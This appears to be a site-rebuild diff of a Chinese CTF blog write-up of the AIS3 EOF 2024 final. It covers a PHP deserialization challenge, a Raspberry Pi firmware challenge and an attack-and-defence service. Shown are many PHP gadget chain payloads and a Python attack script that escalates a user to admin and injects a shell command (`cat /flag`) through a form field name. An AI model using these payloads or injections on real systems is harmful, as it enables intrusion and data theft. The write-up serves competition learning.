-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># before</span></span><br><span class="line"><span class="string">b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:32:"\x00Envms\\FluentPDO\\Query\x00structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:37:"\x00Envms\\FluentPDO\\Structure\x00primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br><span class="line"><span class="comment"># after</span></span><br><span class="line"><span class="string">b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br><span class="line"><span class="comment"># after after</span></span><br><span class="line"><span class="string">'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:6:"fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:5:"regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:10:"statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># before</span></span><br><span class="line"><span class="string">b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:32:"\x00Envms\\FluentPDO\\Query\x00structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:37:"\x00Envms\\FluentPDO\\Structure\x00primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br><span class="line"><span class="comment"># after</span></span><br><span class="line"><span class="string">b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br><span class="line"><span class="comment"># after after</span></span><br><span class="line"><span class="string">'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:6:"fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:5:"regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:10:"statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br></pre></td></tr></table></figure></div>
 
 <p>所以把這個搶回來了, 然後又被搶走了, 因為我 <code>\x00</code> 沒全部處理掉. 但我把其他人的搶走 (對方 payload 後面多了 <code>\n</code>, 刪掉後就得手), 所以我們還是第一, 這題變成比手速的題目了.</p>
 <p>到了下午, 有更多奇怪的手段出現, 像是讓 chain 裡面的字串更短.</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:19:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:5:"mixed";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:16:"@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:0:"";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:13:"\x00*\x00parameters";O:28:"Predis\\Configuration\\Options":3:{s:10:"\x00*\x00options";a:0:{}s:8:"\x00*\x00input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:53:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodeHashCallback";s:10:"p0pp3r_win";s:42:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:11:"\x00*\x00handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:29:"\\Predis\\Configuration\\Options";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection"::{s:10:"parameters";O:28:"Predis\\Configuration\\Options"::{s:7:"options";a::{}s:5:"input";a::{s:10:"persistent";a::{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing"::{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a::{i:0;a::{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a::{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":2:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:0:{}}}'</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:19:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:5:"mixed";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:16:"@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:0:"";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:13:"\x00*\x00parameters";O:28:"Predis\\Configuration\\Options":3:{s:10:"\x00*\x00options";a:0:{}s:8:"\x00*\x00input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:53:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodeHashCallback";s:10:"p0pp3r_win";s:42:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:11:"\x00*\x00handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:29:"\\Predis\\Configuration\\Options";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection"::{s:10:"parameters";O:28:"Predis\\Configuration\\Options"::{s:7:"options";a::{}s:5:"input";a::{s:10:"persistent";a::{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing"::{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a::{i:0;a::{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a::{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":2:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:0:{}}}'</span></span><br></pre></td></tr></table></figure></div>
 
 <p>但最特別的還是這個</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}'</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}'</span></span><br></pre></td></tr></table></figure></div>
 
 <p>這兩個 chain 唯一的差別就是刪掉了最後面的 <code>}</code>, 是 starburst 隊發現的, 我在短短的 5 秒內分析出了這個手段, 然後把更多尾端的 <code>}</code> 刪掉送出, 就成功搶走他們的了, 這前後可能才十秒的時間, 所以這個真的是比手速.</p>
 <p>這題是我跟其他隊交流最多的一題 (有打這題的隊伍比例只有 50%), 能感受到正在跟真人互動, 賽後也跟對上的人聊的很開心.</p>
-<p>補個 splitline 在賽中說其實也可用的 chain 的 <a class="link" target="_blank" rel="noopener" href="https://hackmd.io/@Ching367436/r1w_xLFdo#%E4%BB%BB%E6%84%8F-require--phpinfo-to-RCE">write-up <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, 是去年 edu-ctf 的但沒有官方解答.</p>
+<p>補個 splitline 在賽中說其實也可用的 chain 的 <a class="link" target="_blank" rel="noopener" href="https://hackmd.io/@Ching367436/r1w_xLFdo#%E4%BB%BB%E6%84%8F-require--phpinfo-to-RCE">write-up<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, 是去年 edu-ctf 的但沒有官方解答.</p>
 <h2 id="Pwn2Own"><a href="#Pwn2Own" class="headerlink" title="Pwn2Own"></a>Pwn2Own</h2><p>題目是一個 樹莓派, 上面有 firmware, 是個計分板的 app.</p>
 <p><img src="/ais3-eof-2024-final/pwn2own.webp" alt="pwn2own"></p>
 <p>每組都有一個 pie, 主辦方會將 firmware 放到 google drive 供大家下載, 要自己拆開.</p>
-<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Mre firmware</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Mre firmware</span><br></pre></td></tr></table></figure></div>
 
 <p>拆開後大概長這樣: </p>
 <p><img src="/ais3-eof-2024-final/pwn2own-firmware.webp"></p>
@@ -598,23 +703,23 @@ mjx-container[display="true"] + br {
 <p>有人打成功後主辦會上 patch, 所以會越來越難, 也有少數 pwn 的洞, 像是這個</p>
 <p><img src="/ais3-eof-2024-final/pwn2own-auth.webp"></p>
 <p>這個 bin 是保護全關的, 唯一的缺點是他是 arm-32.</p>
-<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@c603fff492a6 /home# checksec auth</span><br><span class="line">[*] <span class="string">'/home/auth'</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@c603fff492a6 /home# checksec auth</span><br><span class="line">[*] <span class="string">'/home/auth'</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
 
 <p>後面隊友用 Apple ARM 的 Mac Docker 開了對應架構的 VM, 可以跑但不能 gdb, 聽說用 x86 開就可用. 到了隔天, 我幫隊友從我們的 pie 打 shell 出來給用 gdb, 但還是沒找到 stack 的 address… 後來有別隊解出這個洞.</p>
 <p>有另個洞是把 firmware flash 成舊版本, 然後用舊版的洞來打, 後來有 patch 成需要過 auth 才能, 但還是能打過 auth (fixed secret), 但後來時間不夠, 不然基本上 exp 已經寫好了.</p>
 <p>感覺我一開始就跳進這題分數會多很多.</p>
-<p>這題推別隊寫的<a class="link" target="_blank" rel="noopener" href="https://hackmd.io/@TWNWAKing/HJK40Xpca">這篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> write-up.</p>
+<p>這題推別隊寫的<a class="link" target="_blank" rel="noopener" href="https://hackmd.io/@TWNWAKing/HJK40Xpca">這篇<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> write-up.</p>
 <h2 id="hahamut-A-D"><a href="#hahamut-A-D" class="headerlink" title="hahamut [A&D]"></a>hahamut [A&amp;D]</h2><p>這題我基本上只有參與輔助的部分, 題目我沒看. 主要就是自動抓流量來到 Arkime 上看, attack manager 部分由 Wilson 負責, ywc 負責拆 patch. 沒想到過了整個上午我們這隊有洞可以打, 但沒人攻擊 QQ. 直到我午後臨時進入, 從封包抄走別隊的攻擊才開始有攻擊分, 我們隊基本上只有被打穿兩種洞.</p>
 <p>附個攻擊 script.</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_hex</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">f"http://<span class="subst">{sys.argv[<span class="number">1</span>]}</span>:8763"</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line"></span><br><span class="line">    username = token_hex(<span class="number">16</span>)</span><br><span class="line">    sess.post(url + <span class="string">'/register'</span>, data={</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: username,</span><br><span class="line">        <span class="string">'role'</span>: <span class="string">'user'</span></span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    sess.post(url + <span class="string">'/update'</span>, data={</span><br><span class="line">        <span class="string">'user[role]'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 'backup[users]=1&amp;backup[-Iecho+`cat+/flag`&gt;/app/public/af9acdd862352d3d895f16f0dd3380724b0dd33214f1fe8253b6072aaa0b9333e776a1a90555274789a2953c152fafc9]=test'</span></span><br><span class="line">    sess.post(url + <span class="string">'/admin/backup'</span>, data={</span><br><span class="line">        <span class="string">"backup[users]"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">f"backup[-Iecho `cat /flag`&gt;/app/public/<span class="subst">{username}</span>]"</span>: <span class="string">"test"</span></span><br><span class="line">    })</span><br><span class="line">    r = sess.get(url + <span class="string">f'/<span class="subst">{username}</span>.json'</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_hex</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">f"http://<span class="subst">{sys.argv[<span class="number">1</span>]}</span>:8763"</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line"></span><br><span class="line">    username = token_hex(<span class="number">16</span>)</span><br><span class="line">    sess.post(url + <span class="string">'/register'</span>, data={</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: username,</span><br><span class="line">        <span class="string">'role'</span>: <span class="string">'user'</span></span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    sess.post(url + <span class="string">'/update'</span>, data={</span><br><span class="line">        <span class="string">'user[role]'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 'backup[users]=1&amp;backup[-Iecho+`cat+/flag`&gt;/app/public/af9acdd862352d3d895f16f0dd3380724b0dd33214f1fe8253b6072aaa0b9333e776a1a90555274789a2953c152fafc9]=test'</span></span><br><span class="line">    sess.post(url + <span class="string">'/admin/backup'</span>, data={</span><br><span class="line">        <span class="string">"backup[users]"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">f"backup[-Iecho `cat /flag`&gt;/app/public/<span class="subst">{username}</span>]"</span>: <span class="string">"test"</span></span><br><span class="line">    })</span><br><span class="line">    r = sess.get(url + <span class="string">f'/<span class="subst">{username}</span>.json'</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
 
 <p>另外比賽給的 patch 是從 Docker 出來的, 所以拆的時候要像這樣:</p>
-<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> file*</span><br><span class="line">wget --header=<span class="string">"Authorization: &lt;team token&gt;"</span> http://35.221.224.244:8888/patch/123/file</span><br><span class="line">zstd -d file -o file.tar</span><br><span class="line">undocker file.tar team3_r89.tar</span><br><span class="line"><span class="built_in">mkdir</span> team3_r89</span><br><span class="line">tar xvf team3_r89.tar -C team3_r89</span><br><span class="line">diff -r src patches/team3_r89/app/src/</span><br></pre></td></tr></table></figure></div>
